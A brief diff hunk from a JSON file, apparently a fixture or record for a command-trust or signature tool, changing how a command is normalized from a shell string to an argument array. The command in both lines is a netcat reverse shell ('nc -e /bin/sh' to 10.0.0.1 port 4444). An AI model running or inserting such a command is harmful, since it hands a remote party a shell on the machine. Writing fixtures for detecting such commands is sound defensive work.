@@ -61,7 +61,7 @@
     }
   },
   "signature": {
-    "normalized": "nc -e /bin/sh 10.0.0.1 4444",
+    "normalized": "[\"nc\",\"-e\",\"/bin/sh\",\"10.0.0.1\",\"4444\"]",
     "trust": {
       "executable": "nc",
       "argv": [
